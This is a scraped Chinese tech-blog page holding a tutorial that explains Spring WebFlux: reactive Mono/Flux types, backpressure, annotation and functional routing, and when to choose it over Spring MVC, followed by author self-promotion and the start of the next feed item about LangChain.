            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏三说技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:41:39.000Z" title="Tue Dec 09 2025 03:41:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>从早期的 Struts 到统治多年的 Spring MVC，我见证了整个 Java Web 开发框架的演进。</p>
<p>今天，我想和大家深入聊聊 Spring 5 带来的这个“新成员”—— <strong>WebFlux</strong>。</p>
<p>有些小伙伴在工作中可能听说过它，知道它“性能高”、“异步非阻塞”，但真要上手，心里却直打鼓：这和 Spring MVC 到底有啥不同？我的项目真的需要它吗？</p>
<p>今天，我们就从底层原理到实战代码，彻底把 WebFlux 讲明白。</p>
<p><a href="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" title="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank">最近准备面试的小伙伴，可以看一下这个宝藏网站（Java突击队）：www.susan.net.cn，里面：面试八股文、场景设计题、Spring源码解读、8个项目实战、工作内推什么都有</a>。</p>
<h2 data-id="heading-1">01 为什么是WebFlux？</h2>
<p>要理解 WebFlux，必须先看清楚它要解决的问题。我们最熟悉的 Spring MVC，其核心是建立在 Servlet API 之上的<strong>同步阻塞模型</strong>。</p>
<p>想象这样一个场景：你的控制器里有一个方法，需要调用一个外部接口获取数据，这个接口响应很慢，可能需要 2 秒。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 传统的Spring MVC控制器</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TraditionalController</span> {
    <span class="hljs-meta">@GetMapping("/slow")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">slowApi</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 模拟一个耗时2秒的远程调用</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> someSlowRemoteService.call(); <span class="hljs-comment">// 线程在这里被阻塞2秒！</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Data: "</span> + data;
    }
}
</code></pre>
<p><strong>问题出在哪里？</strong> 当请求到达服务器时，Servlet 容器（如 Tomcat）会从它的线程池中分配一个工作线程来处理这个请求。</p>
<p>在这个线程执行 <code>someSlowRemoteService.call()</code> 的整整 2 秒钟里，<strong>这个线程什么也做不了，只能空转、等待</strong>。</p>
<p>它无法去处理其他已经到达的请求。如果同一时间有 1000 个这样的并发请求，Tomcat 就需要准备至少 1000 个线程来应对。</p>
<p>每个线程都消耗内存（约 1MB 栈内存）和 CPU 调度资源。当线程数超过物理核心承载能力，大量的时间将浪费在线程上下文切换上，导致响应变慢，最终可能因资源耗尽而崩溃。</p>
<p>这就是 <strong>“一个请求，一个线程”的阻塞模型在 I/O 密集型场景下的天然瓶颈</strong>。我们投入了大量资源（线程），仅仅是为了“等待”，而不是“计算”。</p>
<p>有些小伙伴在工作中，可能已经通过增大线程池、服务拆分等方式缓解了这个问题，但这本质上是“用资源换吞吐量”，并非最优解。</p>
<h2 data-id="heading-2">02 WebFlux的核心：异步非阻塞与响应式流</h2>
<p>WebFlux 的哲学截然不同。它源于<strong>响应式编程范式</strong>，核心目标是：<strong>用少量、固定的线程，处理大量并发请求</strong>。</p>
<p>如何做到？答案是 <strong>事件驱动</strong> 和 <strong>异步非阻塞 I/O</strong>。它不再让线程傻等，而是告诉系统：“我去做点别的，等数据准备好了，你再回调通知我”。</p>
<h3 data-id="heading-3">Reactor 与 Mono/Flux</h3>
<p>这是理解 WebFlux 的第一道坎。WebFlux 构建在 Project Reactor 响应式库之上，引入了两个核心类型：</p>
<ul>
<li><strong>Mono</strong>： 代表 <strong>0 或 1 个</strong> 结果的异步序列。可以把它想象成一个“未来可能到来的单个数据包”的承诺。</li>
<li><strong>Flux</strong>： 代表 <strong>0 到 N 个</strong> 结果的异步序列。可以把它想象成一个“数据流”，数据项一个接一个地异步发布出来。</li>
</ul>
<p>看一个代码对比，立刻就能明白：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Spring MVC: 直接返回对象</span>
<span class="hljs-meta">@GetMapping("/user/{id}")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
    <span class="hljs-keyword">return</span> userService.findById(id); <span class="hljs-comment">// 阻塞式，线程等待数据库返回</span>
}

<span class="hljs-comment">// WebFlux: 返回Mono，代表一个异步承诺</span>
<span class="hljs-meta">@GetMapping("/user/{id}")</span>
<span class="hljs-keyword">public</span> Mono&lt;User&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
    <span class="hljs-keyword">return</span> userService.findByIdReactive(id); <span class="hljs-comment">// 非阻塞，立即返回Mono，数据稍后填充</span>
}
</code></pre>
<p>在 WebFlux 版本中，<code>getUser</code> 方法<strong>几乎瞬间返回</strong>，返回的是一个 <code>Mono&lt;User&gt;</code> 的空壳。当底层非阻塞数据库驱动真正获取到数据后，会自动将数据“填充”到这个 <code>Mono</code> 里，并最终发送给客户端。在这个过程中，线程没有被挂起，它可以立刻去处理其他请求。</p>
<p>我们可以通过下面这张图，直观感受两种模型处理多个慢请求时的巨大差异：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47208efe6f154e3e9c0f4f454f51dc87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856499&amp;x-signature=sy9F4uC%2FtkQMfAFsd4sOfs8AZ4g%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">背压（Backpressure）：响应式流的精髓</h3>
<p>这或许是 WebFlux 最精妙也最容易被忽视的特性。在传统的拉取模型中，消费者控制节奏。而在响应式流中，数据由生产者主动推送，如果生产者太快，消费者来不及处理怎么办？</p>
<p><strong>背压机制</strong>允许消费者（如下游服务）主动告知生产者（如上游数据源）“我最多还能处理多少”，生产者据此调整推送速率，避免消费者被压垮。这为构建健壮的流处理系统提供了基础保障，是 Reactive Streams 规范的核心。</p>
<h2 data-id="heading-5">03 两种编程模型：注解与函数式</h2>
<p>有些小伙伴一听要学新框架就头大，生怕过去 Spring MVC 的经验白费。别担心，WebFlux 贴心地提供了两种编程模型，平滑过渡。</p>
<h3 data-id="heading-6">1. 注解模型：最熟悉的陌生人</h3>
<p>这种方式和 Spring MVC <strong>几乎一模一样</strong>，学习成本极低。主要区别仅在于返回值和部分参数类型。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveOrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ReactiveOrderService orderService;

    <span class="hljs-comment">// 返回Flux，代表多个订单的流</span>
    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> Flux&lt;Order&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderService.findAll();
    }

    <span class="hljs-comment">// 返回Mono</span>
    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> Mono&lt;Order&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
        <span class="hljs-keyword">return</span> orderService.findById(id);
    }

    <span class="hljs-comment">// 参数也可以是Mono</span>
    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> Mono&lt;Void&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Mono&lt;Order&gt; orderMono)</span> {
        <span class="hljs-keyword">return</span> orderMono.flatMap(orderService::save).then();
    }
}
</code></pre>
<p>可以看到，除了 <code>Flux</code> 和 <code>Mono</code> 这些类型，其他注解 <code>@RestController</code>、<code>@GetMapping</code> 都是老熟人。这对于现有项目进行部分重构或新项目启动非常友好。</p>
<h3 data-id="heading-7">2. 函数式模型：更灵活轻量的选择</h3>
<p>这是 WebFlux 的另一面，更像是在用 <strong>Java 8 的 Lambda 表达式和函数式接口来定义路由和处理逻辑</strong>，它不依赖于注解。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RouterFunctionConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RouterFunction&lt;ServerResponse&gt; <span class="hljs-title function_">routeOrder</span><span class="hljs-params">(ReactiveOrderHandler orderHandler)</span> {
        <span class="hljs-keyword">return</span> RouterFunctions.route()
                .GET(<span class="hljs-string">"/fn/orders"</span>, orderHandler::getAll)
                .GET(<span class="hljs-string">"/fn/orders/{id}"</span>, orderHandler::getById)
                .POST(<span class="hljs-string">"/fn/orders"</span>, orderHandler::create)
                .build();
    }
}

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveOrderHandler</span> {
    <span class="hljs-keyword">public</span> Mono&lt;ServerResponse&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">(ServerRequest request)</span> {
        Flux&lt;Order&gt; orders = ... <span class="hljs-comment">// 获取订单流</span>
        <span class="hljs-keyword">return</span> ServerResponse.ok()
                .contentType(MediaType.APPLICATION_JSON)
                .body(orders, Order.class);
    }
    <span class="hljs-comment">// ... 其他处理方法</span>
}
</code></pre>
<p>函数式模型将所有路由和处理器暴露为明确的 Bean，<strong>声明清晰，易于测试，且运行时开销更小</strong>，特别适合微服务场景中功能明确、结构简洁的端点。</p>
<p>最近为了帮助大家找工作，专门建了一些工作内推群，各大城市都有，欢迎各位HR和找工作的小伙伴进群交流，群里目前已经收集了20多家大厂的工作内推岗位。加苏三的微信：li_su223，备注：掘金+所在城市，即可进群。</p>
<h2 data-id="heading-8">04 深入核心：WebFlux如何运转</h2>
<p>理解了表面用法，我们以注解模型为例，深入一层，看看一个请求在 WebFlux 内部是如何流转的。</p>
<p>WebFlux 的核心调度器不再是 Servlet 容器的线程池，而是一个名为 <code>DispatcherHandler</code> 的组件，它扮演着类似 Spring MVC 中 <code>DispatcherServlet</code> 的角色。</p>
<ol>
<li><strong>请求接收</strong>： 以 Netty 为例，I/O 线程接收到 HTTP 请求，将其封装为 <code>ServerWebExchange</code>（一个非阻塞的请求-响应交换对象）。</li>
<li><strong>寻找处理器</strong>： <code>DispatcherHandler</code> 调用一组 <code>HandlerMapping</code>，根据请求路径等信息，找到对应的控制器方法（就是一个 <code>Handler</code>）。</li>
<li><strong>执行处理</strong>： <code>DispatcherHandler</code> 再通过 <code>HandlerAdapter</code> 去实际执行这个控制器方法。我们的方法返回一个 <code>Mono</code> 或 <code>Flux</code>。</li>
<li><strong>处理结果</strong>： <code>HandlerResultHandler</code> 负责处理这个反应式返回类型，将流中的数据序列化（如转为 JSON），并通过非阻塞 I/O 写回响应。</li>
</ol>
<p>整个过程中，<strong>所有环节都是非阻塞的</strong>。线程只在有 CPU 计算任务时才忙碌，一旦遇到 I/O 等待，就会去处理其他任务，从而实现极高的资源利用率。</p>
<p>下面是 WebFlux 核心组件协同处理请求的架构图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/999baa7b71514b11b705d8981fd15709~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856499&amp;x-signature=dwDZ8W7t5nyQ6VhZVjQESCP2TgU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">05 性能与选择：并非银弹</h2>
<p>读到这里，有些小伙伴可能摩拳擦掌，准备把现有项目全盘迁移到 WebFlux。<strong>且慢！技术选型最忌“为了用而用”</strong>。</p>
<p>WebFlux 和 Spring MVC 不是替代关系，而是互补关系，它们共同扩展了 Spring 生态的能力边界。</p>
<h3 data-id="heading-10">性能真相</h3>
<ul>
<li><strong>WebFlux 的优势在于高并发、低延迟的 I/O 密集型场景</strong>。当你的应用有大量外部调用（数据库、微服务、API）、慢连接或长轮询（如聊天）时，WebFlux 能用更少的资源提供更稳定的吞吐量。</li>
<li><strong>WebFlux 不会让你的 CPU 密集型计算更快</strong>。如果业务逻辑本身就是复杂的计算，没有太多 I/O 等待，那么切换到 WebFlux 可能看不到收益，甚至因为响应式链的开销而略有下降。</li>
<li><strong>资源利用率是核心优势</strong>。WebFlux 通过减少线程数量，降低了内存消耗和上下文切换开销，使系统在压力下的表现更加可预测和稳定。</li>
</ul>
<h3 data-id="heading-11">代价与挑战</h3>
<ul>
<li><strong>编程范式转换</strong>： 从“指令式”思维切换到“声明式”、“函数式”的反应式思维是一大挑战。调试链式调用的 <code>Mono/Flux</code> 也比调试普通代码更困难。</li>
<li><strong>生态兼容性</strong>： 你的整个技术栈都需要支持非阻塞。<strong>这意味着你常用的阻塞式数据库驱动（如 JDBC）、Redis 客户端等可能无法直接使用</strong>，必须寻找其反应式版本（如 R2DBC、Lettuce）。这是一条“全栈反应式”的不归路。</li>
<li><strong>学习曲线</strong>： 团队需要时间学习 Reactor 丰富的操作符（<code>map</code>, <code>flatMap</code>, <code>zip</code> 等）和错误处理机制。</li>
</ul>
<h3 data-id="heading-12">如何选择？</h3>
<p>你可以遵循以下的决策流程，来判断你的项目是否真的需要 WebFlux：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/015ef95dff174171918d00a929c206a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856499&amp;x-signature=qn%2BeB3u21kXBa2mzSMZMaLDKsJE%3D" alt="image.png" loading="lazy"/></p>
<p><strong>对于新项目</strong>： 如果是微服务网关（Spring Cloud Gateway 就是基于 WebFlux）、实时监控、消息推送等场景，WebFlux 是绝佳选择。</p>
<p><strong>对于现有项目</strong>： <strong>不要轻易重构！</strong> 如果 Spring MVC 运行良好，重构的成本和风险极高。</p>
<p>一个更务实的切入点是：<strong>先在 Spring MVC 项目中使用 <code>WebClient</code>（WebFlux 提供的非阻塞 HTTP 客户端）来调用外部慢服务</strong>，这能立即为你的应用带来部分非阻塞的优势。</p>
<hr/>
<h2 data-id="heading-13">06 总结</h2>
<p>WebFlux 是 Spring 应对现代高并发、低延迟应用需求交出的一份优秀答卷。</p>
<p>它通过异步非阻塞和响应式流的技术，在 I/O 密集型领域展现出巨大优势。</p>
<p>但它不是一个“傻瓜式”的性能提升按钮，而是一套完整的、有门槛的新编程范式。</p>
<p>我们的职责不是追逐最酷的技术，而是<strong>为业务场景选择最合适的技术</strong>。</p>
<p>在你决定拥抱 WebFlux 之前，不妨先问自己三个问题：</p>
<ol>
<li>我的应用瓶颈真的是 I/O 吗？</li>
<li>我的团队和技术栈准备好“全栈反应式”了吗？</li>
<li>预期的收益能否覆盖学习和改造成本？</li>
</ol>
<p>想清楚这些问题，你的选择自然会清晰起来。</p>
<p>技术世界没有银弹，<strong>理解原理，权衡利弊，方是长期主义者的生存之道</strong>。</p>
<h2 data-id="heading-14">最后说一句(求关注，别白嫖我)</h2>
<p>如果这篇文章对您有所帮助，或者有所启发的话，帮忙关注一下我的同名公众号：苏三说技术，您的支持是我坚持写作最大的动力。</p>
<p>求一键三连：点赞、转发、在看。</p>
<p>关注公众号：【苏三说技术】，在公众号中回复：进大厂，可以免费获取我最近整理的10万字的面试宝典，好多小伙伴靠这个宝典拿到了多家大厂的offer。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GitHub 12w Star神器！一文详解大模型集成框架LangChain]]></title>    <link>https://juejin.cn/post/7581448482545156122</link>    <guid>https://juejin.cn/post/7581448482545156122</guid>    <pubDate>2025-12-09T03:45:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581448482545156122" data-draft-id="7581619505584472115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GitHub 12w Star神器！一文详解大模型集成框架LangChain"/> <meta itemprop="keywords" content="LangChain,Agent,LLM"/> <meta itemprop="datePublished" content="2025-12-09T03:45:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GitHub 12w Star神器！一文详解大模型集成框架LangChain
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:45:38.000Z" title="Tue Dec 09 2025 03:45:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读49分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body 